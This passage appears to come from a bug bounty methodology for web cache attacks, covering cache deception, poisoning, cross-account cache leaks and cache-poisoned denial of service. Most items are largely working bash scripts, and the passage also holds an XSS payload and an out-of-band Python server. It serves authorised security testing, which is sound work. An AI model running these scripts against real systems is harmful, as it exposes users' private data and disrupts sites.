  back as markup. If the cache decodes percent-encoding (or folds case) before it builds the key, the two spellings
  share one entry: we send the raw form first, and the victim's browser, asking for the encoded form, is served our
  raw response.
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-004"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  P="/cch004"                            # a path prefix whose 404 or error page prints the requested path; edit for the page found
  hit(){ tr -d '\r' < "$1" | grep -qiE '^((cf-cache-status|x-cache|x-vercel-cache|x-nextjs-cache|x-drupal-cache|x-cache-status|cache-status): .*hit|age: *[1-9]|x-varnish: *[0-9]+ +[0-9]+)' && echo HIT || echo MISS; }
  # 1. does the key decode? the browser's spelling first, then the raw spelling of the same new path: a HIT on the second says yes
  b="cch004$RANDOM"
  curl -sS --path-as-is "${HDR[@]}" -D "$D/1.h" -o /dev/null "$T$P/$b%3Cx%3E"; sleep "$W"
  curl -sS --path-as-is "${HDR[@]}" -D "$D/2.h" -o /dev/null "$T$P/$b<x>"; sleep "$W"
  echo "browser spelling $(hit "$D/1.h") | raw spelling $(hit "$D/2.h")" | tee "$D/decode.txt"
  # 2. the attack order on a new path: raw first (curl sends < and > as typed), then the spelling a victim's browser sends
  b="cch004$RANDOM"
  curl -sS --path-as-is "${HDR[@]}" --trace-ascii "$D/3.trace" -o "$D/3.b" "$T$P/$b<cch004b>"; sleep "$W"
  curl -sS --path-as-is "${HDR[@]}" -D "$D/4.h" -o "$D/4.b" "$T$P/$b%3Ccch004b%3E"; sleep "$W"
  grep -m1 'GET ' "$D/3.trace"            # the request line as sent: < and > must be raw
  # 3. control: the browser spelling alone, on another new path
  c="cch004$RANDOM"; curl -sS --path-as-is "${HDR[@]}" -o "$D/5.b" "$T$P/$c%3Ccch004b%3E"; sleep "$W"
  echo "raw reflected: $(grep -c '<cch004b>' "$D/3.b") | browser spelling after it: $(grep -c '<cch004b>' "$D/4.b") $(hit "$D/4.h") | control: $(grep -c '<cch004b>' "$D/5.b")" | tee "$D/attack.txt"
  # 4. the same for a reflected parameter, only after the query proves keyed here (MISS HIT MISS): the raw value first,
  #    then the encoded value on the same buster
  k="cch004k$RANDOM"; for q in "$k" "$k" "${k}x"; do curl -sS "${HDR[@]}" -o /dev/null -D "$D/k.h" "$T/search?$q=1"; printf '%s ' "$(hit "$D/k.h")"; sleep "$W"; done | tee "$D/key.txt"; echo
  b="cch004$RANDOM"
  curl -sS --path-as-is "${HDR[@]}" -o "$D/6.b" "$T/search?$b=1&q=<cch004c>"; sleep "$W"
  curl -sS "${HDR[@]}" -D "$D/7.h" -o "$D/7.b" "$T/search?$b=1&q=%3Ccch004c%3E"; sleep "$W"
  echo "query: raw $(grep -c '<cch004c>' "$D/6.b") | browser spelling $(grep -c '<cch004c>' "$D/7.b") $(hit "$D/7.h")" | tee -a "$D/attack.txt"
  ```
  Steps 1 to 3 need no key check: each path is new, so its key is too. Step 4 stops unless `key.txt` reads MISS HIT
  MISS: with the query outside the key, the raw value would reach the page real visitors get. If curl refused or
  encoded the raw characters (the trace shows `%3C`), send the same request line with
  `printf 'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' "$P/$b<cch004b>" "$H" | openssl s_client -quiet -connect "$H:443" -servername "$H"`,
  adding the programme's required headers from `HDR` as further lines.
- **Proof:** `attack.txt` and the raw captures: `3.trace` showing the request line with `<` and `>` unencoded, `4.h`
  and `4.b` showing the browser spelling receiving `<cch004b>` unencoded with a hit marker, and the control `5.b`
  (the browser spelling on a new path, never preceded by the raw request) reflecting the encoded text.
- **Not a finding when:** the origin decodes the path itself and reflects `<` for the browser spelling too: that is
  plain reflected XSS (XSS-005), and the cache adds nothing. The raw spelling is refused (400) or reflected encoded.
  `decode.txt` shows two misses: the spellings are separate keys. The 404 is never stored (no hit on any spelling).
  The reflection needs only a single quote in the path: browsers send `'` raw there already, so that too is
  XSS-005.
- **Escalate:** CCH-002 (a): the raw request carries `<svg/onload=alert(document.domain)>` (no spaces: a raw space
  ends the request line) and the clean browser loads the encoded spelling, poisoned as CCH-002 describes for this
  item. A folding of case or backslashes that stores the origin's 404 under the real path is CCH-009's mechanism.

### CCH-005 · A private page with a static file name or extension appended (`/account/x.css`, `/account;x.css`, `/account%23x.css`) is answered with the signed-in account's data and stored by the cache, then read with no session

| | |
|---|---|
| **Severity** | Medium standalone when the stored copy holds the account's personal data (e-mail, address, orders); High when it holds a CSRF token, an API key, a session token or a password-reset link; Low when the only account data is a name already public |
| **Requires** | cookie-auth, account |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Use of Cache Containing Sensitive Information · CWE-524 |
| **Prior art** | #1271944, #1530066, #1698316, #1391635 |

- **Where:** authenticated GET routes that return the signed-in account's own data at a URL that is the same for
  every user: `/account`, `/settings`, `/profile`, `/api/me`, `/api/v1/user`, the dashboard, the bootstrap or session
  call a single-page app makes, pages that embed a CSRF token or an API key (from `recon/$H/map.md`). The session
  must ride in a cookie: a link makes the browser send cookies, it cannot add an `Authorization` header.
- **Test:** two rules disagree about one URL. The origin maps `/account/x.css` or `/account;x.css` to the account
  page: routers that ignore trailing segments or accept a wildcard after the route, PHP `PATH_INFO`
  (`/account.php/x.css`), servlet containers and Spring, which drop `;` path parameters before routing, servers that
  stop at a decoded `#`, `?` or NUL. The cache files the URL as static by its extension and stores the response.
  Account A plays the victim who follows our link; the attacker needs no account and reads the stored copy with no
  session.
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-005"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  P=/account                             # a route that returns the signed-in account's own data (recon/$H/map.md)
  M='replace-with-a-value-only-account-A-has'     # its e-mail address or user id
  hit(){ tr -d '\r' < "$1" | grep -qiE '^((cf-cache-status|x-cache|x-vercel-cache|x-nextjs-cache|x-drupal-cache|x-cache-status|cache-status): .*hit|age: *[1-9]|x-varnish: *[0-9]+ +[0-9]+)' && echo HIT || echo MISS; }
  # 0. the route as A and with no session: the marker must be A's alone; note the Cache-Control A's copy carries
  curl -sS "${HDR[@]}" $A -D "$D/0-A.h" -o "$D/0-A.b" "$T$P"; sleep "$W"
  curl -sS "${HDR[@]}" -o "$D/0-anon.b" "$T$P"; sleep "$W"
  echo "A $(grep -c -F "$M" "$D/0-A.b") | no session $(grep -c -F "$M" "$D/0-anon.b") | $(tr -d '\r' < "$D/0-A.h" | grep -i '^cache-control:')" | tee "$D/base.txt"
  # 1. each form: A requests it once (the victim following our link), then a client with no session requests the identical URL.
  #    @ becomes a random name, so every URL is new and no real visitor ever asks for it.
  n=0
  for s in '/@.css' '/@.js' '/@.png' '/@.ico' '/@.svg' '/@.woff2' '/@.avif' ';@.css' '%3b@.css' '%23@.css' '%3f@.css' \
           '%00@.css' '%0a@.css' '%09@.css' '%2f@.css' '.css?@' '/.css?@'; do
    n=$((n+1)); u="$T$P${s//@/cch005$RANDOM}"
    curl -sS --path-as-is "${HDR[@]}" $A -D "$D/$n-A.h" -o "$D/$n-A.b" "$u"; sleep "$W"
    curl -sS --path-as-is "${HDR[@]}" -D "$D/$n-anon.h" -o "$D/$n-anon.b" "$u"; sleep "$W"
    printf '%3s %-10s | A %s %s | no session %s %s %s | %s\n' "$n" "$s" "$(head -1 "$D/$n-A.h" | cut -d' ' -f2)" "$(grep -c -F "$M" "$D/$n-A.b")" \
      "$(head -1 "$D/$n-anon.h" | cut -d' ' -f2)" "$(grep -c -F "$M" "$D/$n-anon.b")" "$(hit "$D/$n-anon.h")" "$u"
  done | tee "$D/results.txt"
  ```
  `$A` is the victim here; the attacker in this item holds no session. A finding is a row where the no-session
  request returns A's marker. The two `.css?@` forms get a new key from the query alone: drop them on a host whose
  probe showed the query outside the key for static files. When A's own request already returns 404 or a redirect
  for every form, the origin maps none of them to the route: move to CCH-006. A cache that stores only after several
  requests (nginx `proxy_cache_min_uses`) needs A's request repeated before the no-session one.
- **Proof:** for the row that holds: `<n>-A` (the victim's request, as the link would make it) and `<n>-anon` (the
  identical URL with no session) returning A's marker with a hit marker, raw, next to `0-anon` (the route itself
  refuses a request with no session). Open the link in the scriptable browser signed in as A where `browser` is
  available, to show the URL a browser sends is the one tested. Name the data category; redact tokens to their
  first and last four characters.
- **Not a finding when:** `<n>-anon` is the logged-out page, a sign-in redirect, a 404 or an empty shell, stored or
  not. A's own request fails (404, a redirect to the canonical URL, 406 for an unknown format): the origin does not
  map that form to the route. Every form misses or shows `DYNAMIC` or `BYPASS`: the cache honours `private`,
  `no-store` or the response's `Set-Cookie`, or Cloudflare's Cache Deception Armor refuses a body whose type does
  not match the extension (#1391635 is titled as a bypass of it with `.avif`). The stored data is a display name, a
  preference or a field shown on the public profile anyway (#439021 was closed informative).
- **Escalate:** a stored CSRF token is the key to CSR-008 (a forged e-mail change carrying the stolen token, proven
  on our own accounts); a stored session token, API key or reset link gets one identity call and then we stop
  (AUT-017 for how long it stays valid). The same route through directory and file-name rules is CCH-006; the route
  stored at its normal URL is INF-013. Delivery: the victim opens our link while signed in (`UI:R`); with a
  `SameSite=Strict` session cookie the link must be followed from inside the application (a message, a comment),
  and the report says which.

### CCH-006 · An encoded dot-segment that only the cache or only the origin resolves (`/static/x/..%2faccount`, `/account;%2f%2e%2e%2frobots.txt`) files a private page under a static directory or file-name rule

| | |
|---|---|
| **Severity** | Medium standalone when the stored copy holds the account's personal data; High when it holds a CSRF token, an API key, a session token or a password-reset link |
| **Requires** | cookie-auth, account |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Use of Cache Containing Sensitive Information · CWE-524 |
| **Prior art** | #260697, #1343086, #397508, #423986 |

- **Where:** the routes CCH-005 used (A's own data at a fixed URL), on hosts whose cache stores by directory
  (`/static/`, `/assets/`, `/_next/static/`, `/wp-content/`, `/media/`) or by exact file name (`/robots.txt`,
  `/favicon.ico`, `/sitemap.xml`). Step 0 shows which rules exist. Run it after CCH-005: extension rules are the
  cheaper test.
- **Test:** either side may resolve `..%2f` and the other not. When the origin decodes `%2f` and resolves the
  dot-segment while the cache matches the raw path, `/static/x/..%2f..%2faccount` is a static URL to the cache and
  the account page to the origin. When the cache decodes and resolves while the origin stops at a delimiter first,
  `/account;%2f%2e%2e%2frobots.txt` is `/robots.txt` to the cache and `/account` to a Java origin. Only forms a
  browser sends unchanged count: a browser resolves a bare `..` or `%2e%2e` segment before sending, and leaves
  `..%2f` and `;%2f%2e%2e%2f` inside a segment alone.
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-006"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  P=/account; M='replace-with-a-value-only-account-A-has'     # as in CCH-005: A plays the victim
  S=( /static/app.css /assets/app.js )   # real files under each static directory the pages load (from the crawl); edit
  hit(){ tr -d '\r' < "$1" | grep -qiE '^((cf-cache-status|x-cache|x-vercel-cache|x-nextjs-cache|x-drupal-cache|x-cache-status|cache-status): .*hit|age: *[1-9]|x-varnish: *[0-9]+ +[0-9]+)' && echo HIT || echo MISS; }
  row(){ local u=$1 n=$2                 # A first (the victim following our link), then no session on the identical URL
    curl -sS --path-as-is "${HDR[@]}" $A -D "$D/$n-A.h" -o "$D/$n-A.b" "$u"; sleep "$W"
    curl -sS --path-as-is "${HDR[@]}" -D "$D/$n-anon.h" -o "$D/$n-anon.b" "$u"; sleep "$W"
    printf '%3s | A %s %s | no session %s %s %s | %s\n' "$n" "$(head -1 "$D/$n-A.h" | cut -d' ' -f2)" "$(grep -c -F "$M" "$D/$n-A.b")" \
      "$(head -1 "$D/$n-anon.h" | cut -d' ' -f2)" "$(grep -c -F "$M" "$D/$n-anon.b")" "$(hit "$D/$n-anon.h")" "$u"; }
  # 0. the static rules: each real file and the fixed names, twice with a new query, then once with another new query
  for u in "${S[@]}" /robots.txt /favicon.ico; do q="cch006$RANDOM"
    for i in 1 2; do curl -sS "${HDR[@]}" -o /dev/null -D "$D/r.h" "$T$u?$q=1"; sleep "$W"; done
    curl -sS "${HDR[@]}" -o /dev/null -D "$D/r2.h" "$T$u?${q}x=1"; sleep "$W"
    echo "$u | repeat: $(hit "$D/r.h") | new query: $(hit "$D/r2.h")"
  done | tee "$D/rules.txt"
  # 1. the origin resolves ..%2f (or ..%5c on Windows servers) and the cache does not: the key keeps the static prefix
  n=0; for s in "${S[@]}"; do pre=${s%/*}; up=$(( $(tr -cd / <<< "$pre" | wc -c) + 1 ))
    for e in 2f 5c; do n=$((n+1)); row "$T$pre/cch006$RANDOM/$(printf "..%%$e%.0s" $(seq 1 $up))${P#/}" "$n"; done
  done | tee "$D/origin-resolves.txt"
  # 2. the cache resolves an encoded traversal that follows a delimiter the origin stops at
  n=100; for d in ';' '%3b' '%23' '%3f' '%00'; do
    for t in "${S[0]#/}" "robots.txt" "favicon.ico"; do n=$((n+1))
      [ "$t" = "${S[0]#/}" ] && t="${t%/*}/cch006$RANDOM.css" || t="$t?cch006$RANDOM"
      row "$T$P$d%2f%2e%2e%2f${t//\//%2f}" "$n"
    done
  done | tee "$D/cache-resolves.txt"
  ```
  Drop the `robots.txt` and `favicon.ico` targets from step 2 when step 0 shows a hit on their new query: their query
  is not in the key, and step 2 would put A's page into the entry every visitor gets for that file. Under a
  directory rule the random name keeps each key new. A finding is a row where the no-session request returns A's
  marker.
- **Proof:** as in CCH-005: `<n>-A` and `<n>-anon` for the row that holds, raw, A's marker in the no-session copy
  with a hit marker, next to the route refusing a request with no session; plus `rules.txt` for the rule that stored
  it, and which side resolved the traversal (Akamai's `X-Cache-Key`, where printed, shows the key the cache built).
  Redact tokens to their first and last four characters.
- **Not a finding when:** the form is refused (400 or 404): Apache refuses `%2f` in a path unless
  `AllowEncodedSlashes` is on, and Tomcat refuses it by default; that is the control holding. A's request returns
  the static file or a 404: neither side resolved the traversal towards the account. The no-session copy is the
  logged-out page. The form works only with a bare `/../` or `/%2e%2e/` segment sent by curl: no victim's browser
  sends it.
- **Escalate:** as CCH-005: CSR-008 for a stored CSRF token, one identity call for a stored session or API token
  (AUT-017), INF-013 when the route is stored at its normal URL. The same `..%2f` disagreement without a cache is a
  path-normalisation bypass of a deny rule (BAC-018).

### CCH-007 · The application's own page or fragment cache stores output built from an unkeyed header or cookie, so one request changes the page for every URL and every cache-buster

| | |
|---|---|
| **Severity** | Medium standalone when the stored fragment rewrites links or a form `action` on every page; High when it is a script or data import (our host on every page for every visitor, with no buster able to isolate it); Low for canonical and meta tags |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cache Poisoning · CWE-349 |
| **Prior art** | #148300 |

- **Where:** an input CCH-001 found reflected (its inert value in an import URL, a link base or a canonical tag), on
  applications that cache rendered output in-process: CMS full-page and block caches (WordPress cache plugins,
  Drupal's page and render caches, Concrete CMS full-page caching, after which #148300 is titled), framework
  fragment caches (Rails `cache` blocks, Django template fragment caching, Laravel response caches). No asset fact
  marks such a cache in advance: the item runs wherever CCH-001 found a reflected input.
- **Test:** these caches sit behind the URL and key on names of their own (a template, a block, a route without its
  query), so the buster that isolates a CDN entry does not isolate them. Send the inert value once and look for it
  where no URL key can explain it: the same path with a new buster, other paths, and the same again a little later.
  Send nothing but the inert value: whatever this cache keeps, every visitor receives.
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-007"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  HN="X-Forwarded-Host"; V="${H^^}:443"  # the input CCH-001 saw reflected; for a cookie: HN=Cookie V='lang=en-cch007'
  P1=/; P2=/about; P3="/zz404-$RANDOM"   # P1: where CCH-001 saw it; P2: another page with the same layout; P3: a 404
  mk(){ echo $(( $(grep -c -F "${H^^}" "$1") + $(grep -ci -F "$H:443" "$1") + $(grep -c 'cch007' "$1") )); }
  # 1. before: the other pages carry no trace of the value
  for p in "$P2" "$P3"; do curl -sS "${HDR[@]}" -o "$D/before.b" "$T$p?cb7$RANDOM=1"; echo "before $p: $(mk "$D/before.b")"; sleep "$W"; done | tee "$D/before.txt"
  # 2. the inert value, once, on P1 with its own buster
  curl -sS "${HDR[@]}" -H "$HN: $V" -o "$D/sent.b" "$T$P1?cb7$RANDOM=1"; echo "sent on $P1: $(mk "$D/sent.b")" | tee "$D/sent.txt"; sleep "$W"
  # 3. where no URL key explains it: P1 with a new buster, P2 and P3; the same again 30 s later
  for t in 0 30; do sleep "$t"; for p in "$P1" "$P2" "$P3"; do
    curl -sS "${HDR[@]}" -D "$D/after.h" -o "$D/after.b" "$T$p?cb7$RANDOM=1"
    echo "t+${t}s $p: $(mk "$D/after.b") | $(tr -d '\r' < "$D/after.h" | grep -iE '^(age|x-cache|cf-cache-status|date):' | tr '\n' ' ')"; sleep "$W"
  done; done | tee "$D/after.txt"
  ```
  A count above zero in step 3 is the finding. Stop sending the input; request P1 with a new buster once every five
  minutes until the count is back to zero, and record how long the value stayed: that is the fragment's lifetime.
- **Proof:** `before.txt`, `sent.txt` and `after.txt`, raw and timed, showing the inert value on a new buster and on
  other pages for a client that never sent it; the line of the page where it sits (an import URL); the lifetime;
  and the statement that the value is inert because a browser lowercases the host and drops the default port, so
  visitors loaded the normal files throughout.
- **Not a finding when:** the value appears only on P1 with the buster it was sent with: that is CCH-001's ordinary
  case. It appears on new busters of P1 and nowhere else, and CCH-001's step 0 had shown the query unkeyed: the CDN,
  not the application. It appears only for some requests (several application servers, each with its own cache):
  still the finding; give the ratio.
- **Escalate:** report with the inert value alone: an attacker who sends the header once puts their host into the
  import on every page for every visitor until the fragment expires, and refills it at will (High for a script
  import). Never repeat it with `$OOB` or a payload: no buster isolates this cache. CCH-002 describes what the
  import would run; the report says it in words.

### CCH-008 · An application-level cache (link previews, lookups, mention cards, search) keys an entry on less than its content depends on, so one account's input or another account's private content is served across accounts

| | |
|---|---|
| **Severity** | Medium standalone when B's private content is served to A; High when it is messages, documents, payment data or tokens; Low when A only changes what B's preview or lookup shows |
| **Requires** | login, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Use of Cache Containing Sensitive Information · CWE-524; Cache Poisoning · CWE-349 for the poisoning direction |
| **Prior art** | #263760, #1767503, #1848940 |

- **Where:** features that compute something once and show it again: link unfurls and previews in posts, chat and
  comments; product, price or profile lookups by URL or id (#1848940 is titled as a URL path manipulation that
  poisoned such a lookup); mention and reference cards for internal objects (#1767503 is titled as reference caching
  that leaks data to unauthorised users); search widgets and autocomplete (#263760 is titled as private posts
  obtained through search-widget preview caches); rendered embeds; dashboard widgets marked "last updated"; GraphQL
  response caches and persisted queries (GQL-012). Signs: a preview that does not change when its source changes,
  "updated N minutes ago", a second request much faster than the first. The poisoning direction needs a host of
  ours that serves pages (`$OOB` as our own server); the leak direction needs only the two accounts.
- **Test:** leak: the permission check runs when the entry is built, not when it is served. B makes the feature
  render one of B's private objects; A, who cannot open the object, asks the feature for the same key and receives
  B's rendering. Poisoning: the key folds together spellings that the fetch keeps apart (case, a trailing slash,
  tracking or extra parameters, an encoded character), so the entry A creates for one spelling is what B is shown
  for the canonical one.
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  F="$T/api/unfurl"; K=url               # the feature's request and the parameter that names the source (proxy history); edit both
  # leak. Create two new private objects as B (a note, file or message only B can open) and paste their URLs:
  O1='<B private object 1>'; O2='<B private object 2>'
  curl -sS "${HDR[@]}" $A -o /dev/null -w "A opens O2 directly: %{http_code}\n" "$O2"; sleep "$W"
  curl -sS "${HDR[@]}" $A -o "$D/l1-A-O1.json" --get --data-urlencode "$K=$O1" "$F"; sleep "$W"   # control: A asks before B
  curl -sS "${HDR[@]}" $B -o "$D/l2-B-O2.json" --get --data-urlencode "$K=$O2" "$F"; sleep "$W"   # B fills the entry for O2
  curl -sS "${HDR[@]}" $A -o "$D/l3-A-O2.json" --get --data-urlencode "$K=$O2" "$F"; sleep "$W"   # the test: A after B
  for f in l1-A-O1 l2-B-O2 l3-A-O2; do printf '%s: ' "$f"; head -c 300 "$D/$f.json"; echo; done | tee "$D/leak.txt"
  # poisoning. On the $OOB host: the exact path /cch008-<digits> gets the title cch008-canonical, any other spelling cch008-A
  cat > srv8.py <<'PY'
  import http.server, re
  class H(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          t = 'cch008-canonical' if re.fullmatch(r'/cch008-\d+', self.path) else 'cch008-A'
          body = ('<html><head><title>%s</title><meta property="og:title" content="%s"></head><body>%s</body></html>' % (t, t, t)).encode()
          self.send_response(200); self.send_header('Content-Type', 'text/html'); self.send_header('Content-Length', str(len(body)))
          self.end_headers(); self.wfile.write(body)
  http.server.HTTPServer(('0.0.0.0', 80), H).serve_forever()
  PY
  python3 srv8.py
  # from our machine: per spelling a new canonical URL; A submits the spelling first, then B submits the canonical URL
  for s in upper slash utm extra enc; do r="cch008-$RANDOM"; c="http://$OOB/$r"
    case $s in upper) v="http://$OOB/${r^^}";; slash) v="$c/";; utm) v="$c?utm_source=cch008";; extra) v="$c?x=1";; enc) v="http://$OOB/${r/-/%2D}";; esac
    curl -sS "${HDR[@]}" $A -o "$D/p-$s-A.json" --get --data-urlencode "$K=$v" "$F"; sleep "$W"
    curl -sS "${HDR[@]}" $B -o "$D/p-$s-B.json" --get --data-urlencode "$K=$c" "$F"; sleep "$W"
    echo "$s | A, $v: $(grep -oE 'cch008-(A|canonical)' "$D/p-$s-A.json" | head -1) | B, canonical: $(grep -oE 'cch008-(A|canonical)' "$D/p-$s-B.json" | head -1)"
  done | tee "$D/poison.txt"
  ```
  The leak holds when `l3` carries B's private title or text and `l1` carries none. The poisoning holds when B's
  canonical request comes back `cch008-A`. When the feature is a post or a message rather than an API call, make the
  same two requests through it (A posts, B posts) and read the rendered card.
- **Proof:** leak: `leak.txt` raw, with `l3` (A, after B) carrying B's private content, `l1` (A before B, on another
  new object) carrying none, and A's direct request to O2 refused. Poisoning: `poison.txt`, B's response for the
  canonical URL showing `cch008-A`, and the `$OOB` server log showing that only A's spelling was fetched. Both
  directions use our own objects and pages only.
- **Not a finding when:** B's content is what any visitor of the object's public page sees. A and B share the space
  where the preview is shown (the same channel or workspace): A is meant to see it. The entry A receives is A's own
  earlier one. B sees `cch008-A` only when B submits A's exact spelling: nothing is folded. The server log shows
  B's request fetched too: the feature refetches and caches nothing under that key.
- **Escalate:** a leak across tenants is rated as a cross-tenant read (BAC items), with the cache named as the
  mechanism. A poisoned preview whose fields render unencoded in B's view is XSS-006. The fetcher behind the preview
  is SSR-001's ground.

### CCH-009 · A header or URL spelling only the attacker sends makes the origin answer with an error, an empty body or the wrong representation, and the cache serves that answer to every client of the key (cache-poisoned denial of service)

| | |
|---|---|
| **Severity** | Medium standalone when a page, or a script or stylesheet it loads, is replaced for every client of the key; High when the file is shared by every page of the main site or by many sites; Low for a single file the pages work without |
| **Requires** | dos-ok |
| **Excluded by** | dos |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Cache Poisoning · CWE-349 |
| **Prior art** | #622122, #1695604, #1096609, #2860983 |

- **Where:** the scripts and stylesheets every page loads (#622122's summary records JavaScript files replaced with
  a 501), the home page and the sign-in page, files on shared static hosts (#1695604 is titled after Shopify's CDN
  hosts), API responses other origins read with CORS. Host by host: the edge and its limits differ per host.
- **Test:** a cache stores what the origin returned for a key whenever its rules call that status cacheable:
  CloudFront keeps 4xx and 5xx answers for 10 seconds by default, many caches keep 404, some keep 400. The inputs
  that the edge passes and the origin rejects or answers differently: a header longer than the origin's limit
  (nginx and Apache allow about 8 KB per header line, CDNs more), a header value with a control character, a method
  override to `HEAD` (an empty body stored as the GET answer: #2860983), a `Trailer` header (#1219038), scheme and
  port headers that make the origin redirect to the same URL, a `Host` with a port, a representation header the
  response has no `Vary` for (`Accept`, `X-Requested-With`, `RSC: 1` on a Next.js App Router page behind a CDN that
  ignores `Vary`, an `Origin` reflected into `Access-Control-Allow-Origin`: #591302), and spellings the cache folds
  into the real path while the origin answers 404 (a backslash: #1695604; upper case).
- **How:**
  ```bash
  D="$E/evidence/$H/CCH-009"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  S="/static/app.js"                     # a script or stylesheet every page loads (from the crawl), or / for the page itself
  hit(){ tr -d '\r' < "$1" | grep -qiE '^((cf-cache-status|x-cache|x-vercel-cache|x-nextjs-cache|x-drupal-cache|x-cache-status|cache-status): .*hit|age: *[1-9]|x-varnish: *[0-9]+ +[0-9]+)' && echo HIT || echo MISS; }
  req(){ local f=$1; shift; curl -sS --path-as-is "${HDR[@]}" -D "$f" -o /dev/null -w '%{http_code}/%{size_download}/%{content_type}' "$@"; sleep "$W"; }
  # 0. the buster is in the key for this file: MISS HIT MISS
  k="cch009k$RANDOM"
  echo "$(req "$D/k1.h" "$T$S?$k=1") $(hit "$D/k1.h") | $(req "$D/k2.h" "$T$S?$k=1") $(hit "$D/k2.h") | $(req "$D/k3.h" "$T$S?${k}x=1") $(hit "$D/k3.h")" | tee "$D/key.txt"
  # 1. one fresh buster per vector: with the vector, then the same URL from a clean client, then a new buster as the control
  vec(){ case $1 in
    hho)     printf '%s\n' -H "X-Cch009: $(head -c 10000 /dev/zero | tr '\0' a)" ;;
    hmc)     printf '%s\n' -H $'X-Cch009: a\x07b' ;;
    hmo)     printf '%s\n' -H 'X-HTTP-Method-Override: HEAD' -H 'X-HTTP-Method: HEAD' -H 'X-Method-Override: HEAD' ;;
    trailer) printf '%s\n' -H 'Trailer: cch009' ;;
    scheme)  printf '%s\n' -H 'X-Forwarded-Proto: http' -H 'X-Forwarded-Scheme: http' -H 'X-Forwarded-Ssl: off' ;;
    port)    printf '%s\n' -H "Host: $H:1" ;;
    accept)  printf '%s\n' -H 'Accept: application/json' ;;
    xrw)     printf '%s\n' -H 'X-Requested-With: XMLHttpRequest' ;;
    rsc)     printf '%s\n' -H 'RSC: 1' ;;
    origin)  printf '%s\n' -H 'Origin: https://cch009.example.org' ;;
  esac; }
  for v in hho hmc hmo trailer scheme port accept xrw rsc origin; do b="cch009$RANDOM"; mapfile -t a < <(vec "$v")
    r1=$(req "$D/$v.1.h" "${a[@]}" "$T$S?$b=1"); r2=$(req "$D/$v.2.h" "$T$S?$b=1"); r3=$(req "$D/$v.3.h" "$T$S?${b}x=1")
    printf '%-8s | with %-30s | clean, same key %-30s %s | clean, new key %s\n' "$v" "$r1" "$r2" "$(hit "$D/$v.2.h")" "$r3"
  done | tee "$D/vectors.txt"
  grep -i '^access-control-allow-origin' "$D/origin.2.h"     # the origin row: our origin granted to every client of the key?
  # 2. a file path only: spellings the cache may fold into the real path while the origin answers 404 (a backslash, upper case)
  for alt in "${S%/*}\\${S##*/}" "${S^^}"; do b="cch009$RANDOM"
    r1=$(req "$D/alt.1.h" "$T$alt?$b=1"); r2=$(req "$D/alt.2.h" "$T$S?$b=1")
    echo "$alt | spelling $r1 | real path, same buster $r2 $(hit "$D/alt.2.h")"
  done | tee "$D/spellings.txt"
  ```
  Check with `--trace-ascii` that the backslash and the control character left curl as typed. An unknown
  `Transfer-Encoding` on a GET (#622122) touches the boundary between edge and origin: send it only after the SMG
  chapter's timing check shows the two agree, once, with no body. Method overrides use `HEAD` only: an override to
  `DELETE` or `POST` can run a state-changing handler. Never send a vector without a buster, never repeat one to
  keep an entry alive, and never on the real URL, even under `dos-ok`.
- **Proof:** `key.txt` (the buster is keyed on this file) and the row of `vectors.txt` or `spellings.txt` where the
  clean request on the same key gets the error, the empty body or the wrong type with a hit marker while the new key
  answers normally, all raw; the page that loads the file, to show what visitors would lose; the lifetime (`Age`
  against `max-age`, or CloudFront's 10-second default), which tells the programme how often an attacker must repeat
  the request.
- **Not a finding when:** the clean request on the same key is normal: the vector is keyed, or the error is not
  stored. The edge rejects the vector itself (its own error page, never stored). CloudFront labels every error
  `Error from cloudfront`, stored or not: there the clean request's status against the new key's is the proof, not
  the label. The `origin` row on a response without `Access-Control-Allow-Origin`.
- **Escalate:** the policy decides: under the `dos` exclusion the item is closed and a primitive seen elsewhere is
  recorded `parked`. A folding spelling that stores the origin's 404 is CCH-004's mechanism too: if that 404 prints
  the path, the error is a reflection. A stored redirect to our host in place of a loop is RDR-010.

## Graveyard

- **A reflected header that no clean client receives.** `X-Forwarded-Host` echoed into the response of the request
  that carried it, with nothing stored (`host-header`). The Host-header titles in the class show the result:
  #283786 was closed N/A as out of scope and #277192 as a duplicate. CCH-001's clean request `v2` is what makes it a
  finding.
- **"Possible cache poisoning".** A report with the reflection and a hit marker on the poisoning request itself, but
  no second, clean client receiving the change (#737315 is titled as possible cache poisoning). A triager reads it
  as a reflection.
- **Metadata only.** Our value in `rel=canonical`, `og:url`, `hreflang` or a sitemap of a stored page:
  search-engine metadata, informative on most programmes.
- **Denial of service where the policy excludes it (`dos`).** 18 of the 48 reports filed under the class are titled
  as denial of service or inaccessibility and they carry the four largest bounties, but a programme that excludes
  availability closes them N/A. CCH-009 runs only under `dos-ok`. Where the policy excludes floods and volumetric tests and says nothing
  about cache poisoning, the operator asks the programme before setting `dos-ok`.
- **Deception of nothing private.** A deceptive URL that stores a page whose only account data is a name, a
  preference or a public field: #439021 was closed informative and #1484468 was rated low as theoretical. A finding
  needs personal data, a token or a CSRF value.
- **The browser's own cache.** "The back button shows the account page after logout", or no `Cache-Control:
  no-store` on an authenticated page, with no shared cache storing anything: `missing-headers` and
  `session-expiry`. A shared cache that stores an authenticated page at its normal URL is INF-013.
